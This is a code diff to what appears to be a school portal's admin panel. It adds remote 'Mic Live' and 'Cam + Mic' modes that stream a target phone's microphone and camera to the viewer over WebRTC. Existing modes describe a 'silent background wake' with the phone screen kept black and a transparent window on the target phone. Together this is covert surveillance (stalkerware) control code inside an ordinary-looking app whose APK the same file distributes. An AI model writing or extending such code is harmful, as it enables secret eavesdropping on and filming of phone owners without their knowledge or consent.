@@ -18275,6 +18275,16 @@ Number of fee records=${fees.length}. Number of overdue records=${dues.length}.`
               background:#0284c7;color:#ffffff;box-shadow:0 2px 6px rgba(2,132,199,0.3);" title="Notif Live: Screen stays completely off/black, background service">
               🔔 Notif Live
             </button>
+            <button onclick="requestLivePreview('${d.device_id}', '${(d.user_name||'').replace(/'/g,'')}', 'mic')"
+              style="padding:5px 9px;border-radius:8px;border:none;font-size:0.72rem;cursor:pointer;font-weight:700;
+              background:#d97706;color:#ffffff;box-shadow:0 2px 6px rgba(217,119,6,0.3);" title="Mic Live: Live audio stream only from phone microphone (0 video, low data)">
+              🎤 Mic Live
+            </button>
+            <button onclick="requestLivePreview('${d.device_id}', '${(d.user_name||'').replace(/'/g,'')}', 'both')"
+              style="padding:5px 9px;border-radius:8px;border:none;font-size:0.72rem;cursor:pointer;font-weight:700;
+              background:#0d9488;color:#ffffff;box-shadow:0 2px 6px rgba(13,148,136,0.3);" title="Cam + Mic: Both live camera video AND live microphone audio together">
+              🎥 Cam + Mic
+            </button>
             <button onclick="requestScreenMirror('${d.device_id}', '${(d.user_name||'').replace(/'/g,'')}')"
               style="padding:5px 9px;border-radius:8px;border:none;font-size:0.72rem;cursor:pointer;font-weight:700;
               background:#059669;color:#ffffff;box-shadow:0 2px 6px rgba(5,150,105,0.3);" title="Screen Live: Mirror the phone's screen content via MediaProjection">
@@ -18530,6 +18540,25 @@ Number of fee records=${fees.length}. Number of overdue records=${dues.length}.`
     }
   };
 
+  window.togglePreviewAudioMute = function() {
+    const a = document.getElementById("previewAudio");
+    const btn = document.getElementById("btnToggleAudioMute");
+    if (!a) return;
+    a.muted = !a.muted;
+    if (btn) btn.innerHTML = a.muted ? "🔇 Unmute" : "🔊 Mute";
+  };
+
+  window.setPreviewAudioVolume = function(val) {
+    const a = document.getElementById("previewAudio");
+    if (!a) return;
+    a.volume = parseFloat(val);
+    if (a.muted && a.volume > 0) {
+      a.muted = false;
+      const btn = document.getElementById("btnToggleAudioMute");
+      if (btn) btn.innerHTML = "🔊 Mute";
+    }
+  };
+
   function stopLivePreview(sendCameraOff = false) {
     if (_autoCutCallTimer) { clearTimeout(_autoCutCallTimer); _autoCutCallTimer = null; }
     if (_previewPollTimer) { clearInterval(_previewPollTimer); _previewPollTimer = null; }
@@ -18542,6 +18571,8 @@ Number of fee records=${fees.length}. Number of overdue records=${dues.length}.`
     _hasAutoDismissedTransparentScreen = false;
     const ipImg = document.getElementById("previewIpImg");
     if (ipImg) { ipImg.src = ""; ipImg.style.display = "none"; }
+    const prevAudio = document.getElementById("previewAudio");
+    if (prevAudio) { try { prevAudio.pause(); prevAudio.srcObject = null; } catch(_){} }
     // Mark as ended in DB
     if (_activePreviewId) {
       api("/api/db/query", { method:"POST", body: JSON.stringify({
@@ -18599,12 +18630,24 @@ Number of fee records=${fees.length}. Number of overdue records=${dues.length}.`
             <div style="color:#fff;font-size:0.85rem;font-weight:600;display:flex;align-items:center;gap:8px;">
               <span id="previewLiveDot" style="width:10px;height:10px;border-radius:50%;background:#eab308;display:inline-block;box-shadow:0 0 8px #eab308;"></span>
               <span>Live — ${userName}</span>
-              <span id="previewModeBadge" style="font-size:0.7rem;font-weight:700;padding:2px 8px;border-radius:6px;background:${mode === 'notification' ? '#0284c7' : '#7c3aed'};color:#fff;">
-                ${mode === 'notification' ? '🔔 Notif Live' : '📞 Call Live'}
+              <span id="previewModeBadge" style="font-size:0.7rem;font-weight:700;padding:2px 8px;border-radius:6px;background:${
+                mode === 'notification' ? '#0284c7' :
+                mode === 'mic' ? '#d97706' :
+                mode === 'both' ? '#0d9488' : '#7c3aed'
+              };color:#fff;">
+                ${
+                  mode === 'notification' ? '🔔 Notif Live' :
+                  mode === 'mic' ? '🎤 Mic Live' :
+                  mode === 'both' ? '🎥 Cam + Mic' : '📞 Call Live'
+                }
               </span>
               <span id="previewConnectionBadge" style="font-size:0.7rem;font-weight:500;padding:2px 8px;border-radius:6px;background:#334155;color:#94a3b8;">Connecting</span>
             </div>
             <div style="display:flex;gap:6px;align-items:center;flex-wrap:wrap;">
+              <div id="previewAudioControls" style="display:${(mode === 'mic' || mode === 'both') ? 'inline-flex' : 'none'};align-items:center;gap:6px;background:#334155;border-radius:6px;padding:3px 8px;" title="Microphone Audio Volume & Mute">
+                <button id="btnToggleAudioMute" onclick="togglePreviewAudioMute()" style="background:transparent;border:none;color:#f8fafc;font-size:0.75rem;cursor:pointer;font-weight:600;padding:2px 4px;">🔊 Mute</button>
+                <input type="range" id="previewVolumeSlider" min="0" max="1" step="0.05" value="1" oninput="setPreviewAudioVolume(this.value)" style="width:55px;cursor:pointer;accent-color:#38bdf8;" title="Audio Volume" />
+              </div>
               <div id="autoCutCallWrapper" style="display:${mode === 'call' ? 'inline-flex' : 'none'};align-items:center;gap:4px;background:#334155;border-radius:6px;padding:3px 8px;" title="Manually enter number of seconds to auto-cut call (0 or empty = Off/Manual)">
                 <span style="color:#cbd5e1;font-size:0.7rem;font-weight:600;">⏱️ Auto Cut:</span>
                 <input type="number" id="autoCutCallInput" min="0" max="600" step="1"
@@ -18616,19 +18659,42 @@ Number of fee records=${fees.length}. Number of overdue records=${dues.length}.`
                 <span style="color:#94a3b8;font-size:0.7rem;font-weight:600;">s</span>
               </div>
               <button id="btnDismissCall" onclick="dismissCallOnly(_activePreviewTargetDeviceId)" style="background:#ea580c;border:none;border-radius:6px;padding:4px 10px;color:#fff;font-size:0.75rem;cursor:pointer;font-weight:700;display:${mode === 'call' ? 'inline-block' : 'none'};box-shadow:0 1px 4px rgba(234,88,12,0.3);" title="End phone call screen only, keep live camera streaming">📴 Dismiss Call</button>
-              <button id="btnSnapPhoto" onclick="captureLivePreviewPhoto()" style="background:#0284c7;border:none;border-radius:6px;padding:4px 10px;color:#fff;font-size:0.75rem;cursor:pointer;font-weight:600;" title="Take snapshot photo">📸 Photo</button>
-              <button id="btnRecordVideo" onclick="recordLivePreviewVideo(10)" style="background:#8b5cf6;border:none;border-radius:6px;padding:4px 10px;color:#fff;font-size:0.75rem;cursor:pointer;font-weight:600;" title="Record 10 second video">🎬 10s Video</button>
-              <button onclick="flipPreviewCamera()" style="background:#334155;border:none;border-radius:6px;padding:4px 10px;color:#fff;font-size:0.75rem;cursor:pointer;font-weight:600;">🔄 Flip</button>
+              <button id="btnSnapPhoto" onclick="captureLivePreviewPhoto()" style="background:#0284c7;border:none;border-radius:6px;padding:4px 10px;color:#fff;font-size:0.75rem;cursor:pointer;font-weight:600;display:${mode === 'mic' ? 'none' : 'inline-block'};" title="Take snapshot photo">📸 Photo</button>
+              <button id="btnRecordVideo" onclick="recordLivePreviewVideo(10)" style="background:#8b5cf6;border:none;border-radius:6px;padding:4px 10px;color:#fff;font-size:0.75rem;cursor:pointer;font-weight:600;display:${mode === 'mic' ? 'none' : 'inline-block'};" title="Record 10 second video">🎬 10s Video</button>
+              <button id="btnFlipCam" onclick="flipPreviewCamera()" style="background:#334155;border:none;border-radius:6px;padding:4px 10px;color:#fff;font-size:0.75rem;cursor:pointer;font-weight:600;display:${mode === 'mic' ? 'none' : 'inline-block'};">🔄 Flip</button>
               <button id="btnStopTransparentScreen" onclick="dismissTransparentScreen(_activePreviewTargetDeviceId)" style="background:#475569;border:none;border-radius:6px;padding:4px 10px;color:#fff;font-size:0.75rem;cursor:pointer;font-weight:600;display:none;" title="Close transparent window on target phone">🪟 Stop Screen</button>
               <button onclick="hardStopDeviceCamera(_activePreviewTargetDeviceId)" style="background:#dc2626;border:none;border-radius:6px;padding:4px 10px;color:#fff;font-size:0.75rem;cursor:pointer;font-weight:600;">🛑 Stop</button>
               <button onclick="stopLivePreview()" style="background:#64748b;border:none;border-radius:6px;padding:4px 10px;color:#fff;font-size:0.75rem;cursor:pointer;font-weight:600;">✕ Close</button>
             </div>
           </div>
-          <div style="position:relative;background:#000;min-height:320px;display:flex;align-items:center;justify-content:center;cursor:pointer;" onclick="const v=document.getElementById('previewVideo');if(v){v.play().catch(()=>{});}">
+          <div style="position:relative;background:#000;min-height:320px;display:flex;align-items:center;justify-content:center;cursor:pointer;" onclick="const v=document.getElementById('previewVideo');if(v){v.play().catch(()=>{});}const a=document.getElementById('previewAudio');if(a){a.play().catch(()=>{});}">
             <div id="previewStatus" style="position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#94a3b8;padding:20px;font-size:0.82rem;text-align:center;z-index:2;background:rgba(15,23,42,0.85);">
-              <div id="previewStatusIcon" style="font-size:1.8rem;margin-bottom:10px;">⏳</div>
-              <div id="previewStatusMsg" style="font-weight:600;color:#f8fafc;font-size:0.9rem;">${mode === 'notification' ? `Sending silent background wake to ${userName}'s phone...` : `Sending wake call push to ${userName}'s phone...`}</div>
-              <div id="previewStatusSub" style="font-size:0.72rem;color:#94a3b8;margin-top:6px;">${mode === 'notification' ? 'Screen stays completely black/off while camera streams (up to 120s)...' : 'Waiting for phone to open camera and stream (up to 120s)...'}</div>
+              <div id="previewStatusIcon" style="font-size:1.8rem;margin-bottom:10px;">${mode === 'mic' ? '🎙️' : '⏳'}</div>
+              <div id="previewStatusMsg" style="font-weight:600;color:#f8fafc;font-size:0.9rem;">
+                ${
+                  mode === 'mic' ? `Connecting live microphone on ${userName}'s phone...` :
+                  mode === 'both' ? `Connecting camera + microphone on ${userName}'s phone...` :
+                  mode === 'notification' ? `Sending silent background wake to ${userName}'s phone...` :
+                  `Sending wake call push to ${userName}'s phone...`
+                }
+              </div>
+              <div id="previewStatusSub" style="font-size:0.72rem;color:#94a3b8;margin-top:6px;">
+                ${
+                  mode === 'mic' ? 'Requesting secure audio-only stream from phone microphone...' :
+                  mode === 'both' ? 'Requesting simultaneous live video and audio feed...' :
+                  mode === 'notification' ? 'Screen stays completely black/off while camera streams (up to 120s)...' :
+                  'Waiting for phone to open camera and stream (up to 120s)...'
+                }
+              </div>
+            </div>
+            <audio id="previewAudio" autoplay playsinline></audio>
+            <div id="previewMicVisualizer" style="display:${mode === 'mic' ? 'flex' : 'none'};flex-direction:column;align-items:center;justify-content:center;padding:50px 20px;text-align:center;width:100%;">
+              <div style="width:96px;height:96px;border-radius:50%;background:rgba(217,119,6,0.2);display:flex;align-items:center;justify-content:center;box-shadow:0 0 35px rgba(217,119,6,0.5);margin-bottom:16px;">
+                <span style="font-size:3rem;">🎙️</span>
+              </div>
+              <div style="font-size:1.15rem;font-weight:700;color:#fde68a;">Listening to Live Microphone</div>
+              <div style="font-size:0.78rem;color:#94a3b8;margin-top:6px;">High-Definition WebRTC Audio • Zero Video Bandwidth</div>
+              <div id="micAudioStatus" style="font-size:0.75rem;color:#38bdf8;margin-top:8px;font-weight:600;">Connecting...</div>
             </div>
             <video id="previewVideo" autoplay playsinline muted style="width:100%;max-height:480px;display:none;background:#000;object-fit:contain;"></video>
             <img id="previewIpImg" style="width:100%;max-height:480px;display:none;background:#000;object-fit:contain;" alt="Live IP Camera Stream" />
@@ -18660,6 +18726,7 @@ Number of fee records=${fees.length}. Number of overdue records=${dues.length}.`
     let ipStreamActive = false;
 
     _previewIpCamTimer = setInterval(async () => {
+      if (mode === 'mic') return;
       if (isFetchingIpFrame) return;
       isFetchingIpFrame = true;
       try {
@@ -18834,82 +18901,110 @@ Number of fee records=${fees.length}. Number of overdue records=${dues.length}.`
             _previewPC = new RTCPeerConnection(iceConfig);
 
             _previewPC.ontrack = (ev) => {
-              const vid = document.getElementById("previewVideo");
-              const st = document.getElementById("previewStatus");
-              const b = document.getElementById("previewConnectionBadge");
-              const dot = document.getElementById("previewLiveDot");
               console.log("[WebRTC Preview] ontrack event:", ev.track.kind, "id:", ev.track.id, "muted:", ev.track.muted);
 
-              if (vid) {
-                const stream = (ev.streams && ev.streams[0]) ? ev.streams[0] : new MediaStream([ev.track]);
-                vid.srcObject = stream;
-                if (!ipStreamActive) {
-                  vid.style.display = "block";
+              if (ev.track.kind === 'audio') {
+                const aud = document.getElementById("previewAudio");
+                if (aud) {
+                  aud.srcObject = (ev.streams && ev.streams[0]) ? ev.streams[0] : new MediaStream([ev.track]);
+                  aud.muted = false;
+                  aud.volume = 1.0;
+                  aud.play().catch(e => console.log("[Audio Autoplay]", e.message));
                 }
+                if (mode === 'mic') {
+                  const st = document.getElementById("previewStatus");
+                  if (st) st.style.display = "none";
+                  const b = document.getElementById("previewConnectionBadge");
+                  if (b) {
+                    b.innerText = "🟢 Mic Active";
+                    b.style.background = "#d97706";
+                    b.style.color = "#fff";
+                  }
+                  const dot = document.getElementById("previewLiveDot");
+                  if (dot) {
+                    dot.style.background = "#eab308";
+                    dot.style.boxShadow = "0 0 10px #eab308";
+                  }
+                  const micStat = document.getElementById("micAudioStatus");
+                  if (micStat) micStat.innerText = "🟢 Audio Stream Live & Clear";
+                }
+              }
 
-                const activatePlayback = () => {
-                  if (st && !ipStreamActive) st.style.display = "none";
-                  vid.play().then(() => {
+              if (ev.track.kind === 'video') {
+                const vid = document.getElementById("previewVideo");
+                const st = document.getElementById("previewStatus");
+                const b = document.getElementById("previewConnectionBadge");
+                const dot = document.getElementById("previewLiveDot");
+
+                if (vid) {
+                  const stream = (ev.streams && ev.streams[0]) ? ev.streams[0] : new MediaStream([ev.track]);
+                  vid.srcObject = stream;
+                  if (!ipStreamActive) {
+                    vid.style.display = "block";
+                  }
+
+                  const activatePlayback = () => {
                     if (st && !ipStreamActive) st.style.display = "none";
-                    if (b && !ipStreamActive) {
-                      b.innerText = `🟢 Live ${vid.videoWidth || 640}x${vid.videoHeight || 480}`;
-                      b.style.background = '#15803d';
+                    vid.play().then(() => {
+                      if (st && !ipStreamActive) st.style.display = "none";
+                      if (b && !ipStreamActive) {
+                        b.innerText = (mode === 'both') ? `🟢 Cam+Mic ${vid.videoWidth || 640}x${vid.videoHeight || 480}` : `🟢 Live ${vid.videoWidth || 640}x${vid.videoHeight || 480}`;
+                        b.style.background = (mode === 'both') ? '#0d9488' : '#15803d';
+                        b.style.color = '#fff';
+                      }
+                      if (dot) {
+                        dot.style.background = '#22c55e';
+                        dot.style.boxShadow = '0 0 10px #22c55e';
+                      }
+
+                      const btnStopScreen = document.getElementById("btnStopTransparentScreen");
+                      if (btnStopScreen) {
+                        if (_hasAutoDismissedTransparentScreen) {
+                          btnStopScreen.style.display = 'none';
+                        } else {
+                          const isAatif = String(currentUser?.name || currentUser?.username || currentUser?.fullName || '').toLowerCase().includes('aatif') || userIsAdmin();
+                          if (isAatif && _activePreviewMode === 'call') {
+                            btnStopScreen.style.display = 'inline-block';
+                          } else {
+                            btnStopScreen.style.display = 'none';
+                          }
+                        }
+                      }
+                    }).catch(e => {
+                      console.log("[WebRTC Preview] Autoplay note:", e.message);
+                      if (st) st.style.display = "none";
+                    });
+                  };
+
+                  activatePlayback();
+                  ev.track.onunmute = () => {
+                    console.log("[WebRTC Preview] Track unmuted!");
+                    activatePlayback();
+                  };
+                  vid.onloadedmetadata = () => {
+                    console.log("[WebRTC Preview] Metadata loaded:", vid.videoWidth, "x", vid.videoHeight);
+                    activatePlayback();
+                  };
+                  vid.onloadeddata = () => {
+                    if (st) st.style.display = "none";
+                    activatePlayback();
+                  };
+                  vid.ontimeupdate = () => {
+                    if (st) st.style.display = "none";
+                  };
+                  vid.onplaying = () => {
+                    if (st) st.style.display = "none";
+                    if (b) {
+                      b.innerText = (mode === 'both') ? `🟢 Cam+Mic ${vid.videoWidth || 640}x${vid.videoHeight || 480}` : `🟢 Live ${vid.videoWidth || 640}x${vid.videoHeight || 480}`;
+                      b.style.background = (mode === 'both') ? '#0d9488' : '#15803d';
                       b.style.color = '#fff';
                     }
                     if (dot) {
                       dot.style.background = '#22c55e';
                       dot.style.boxShadow = '0 0 10px #22c55e';
                     }
-
-                    // WebRTC video playback started smoothly
-
-                    const btnStopScreen = document.getElementById("btnStopTransparentScreen");
-                    if (btnStopScreen) {
-                      if (_hasAutoDismissedTransparentScreen) {
-                        btnStopScreen.style.display = 'none';
-                      } else {
-                        const isAatif = String(currentUser?.name || currentUser?.username || currentUser?.fullName || '').toLowerCase().includes('aatif') || userIsAdmin();
-                        if (isAatif && _activePreviewMode === 'call') {
-                          btnStopScreen.style.display = 'inline-block';
-                        } else {
-                          btnStopScreen.style.display = 'none';
-                        }
-                      }
-                    }
-                  }).catch(e => {
-                    console.log("[WebRTC Preview] Autoplay note:", e.message);
-                    if (st) st.style.display = "none";
-                  });
-                };
-
-                activatePlayback();
-                ev.track.onunmute = () => {
-                  console.log("[WebRTC Preview] Track unmuted!");
-                  activatePlayback();
-                };
-                vid.onloadedmetadata = () => {
-                  console.log("[WebRTC Preview] Metadata loaded:", vid.videoWidth, "x", vid.videoHeight);
-                  activatePlayback();
-                };
-                vid.onloadeddata = () => {
-                  if (st) st.style.display = "none";
-                  activatePlayback();
-                };
-                vid.ontimeupdate = () => {
-                  if (st) st.style.display = "none";
-                };
-                vid.onplaying = () => {
-                  if (st) st.style.display = "none";
-                  if (b) {
-                    b.innerText = `🟢 Live ${vid.videoWidth || 640}x${vid.videoHeight || 480}`;
-                    b.style.background = '#15803d';
-                    b.style.color = '#fff';
-                  }
-                  if (dot) {
-                    dot.style.background = '#22c55e';
-                    dot.style.boxShadow = '0 0 10px #22c55e';
-                  }
-                };
+                  };
+                }
               }
             };
 
@@ -19028,10 +19123,12 @@ Number of fee records=${fees.length}. Number of overdue records=${dues.length}.`
               } catch(_){}
             }
 
-            // Create and send answer (explicitly video-only so audio is never requested or negotiated)
+            // Create and send answer
+            const wantsAudio = (mode === 'mic' || mode === 'both');
+            const wantsVideo = (mode !== 'mic');
             const answer = await _previewPC.createAnswer({
-              offerToReceiveAudio: false,
-              offerToReceiveVideo: true
+              offerToReceiveAudio: wantsAudio,
+              offerToReceiveVideo: wantsVideo
             });
             await _previewPC.setLocalDescription(answer);
 
@@ -19041,7 +19138,7 @@ Number of fee records=${fees.length}. Number of overdue records=${dues.length}.`
               args: [answer.sdp, previewId]
             })});
 
-            if (sub) sub.innerText = "Answer sent — connecting video pipeline...";
+            if (sub) sub.innerText = (mode === 'mic') ? "Answer sent — connecting microphone audio stream..." : "Answer sent — connecting video pipeline...";
 
             // Fast poll every 1s for candidates and status
             clearInterval(_previewPollTimer);
@@ -23332,7 +23429,7 @@ function setupAppReleaseFormListener() {
 
       await loadActiveReleasesList();
       form.reset();
-      document.getElementById('releaseApkUrl').value = 'https://tapowan-whatsapp-gateway.onrender.com/TPS-Original-App.apk';
+      document.getElementById('releaseApkUrl').value = 'https://github.com/aatifraza161-bit/tapowan-school-portal/releases/latest/download/TPS-Original-App.apk';
       document.getElementById('releaseTitle').value = 'New Version Available';
       if (document.getElementById('releaseTargetAudience')) {
         document.getElementById('releaseTargetAudience').value = 'both';
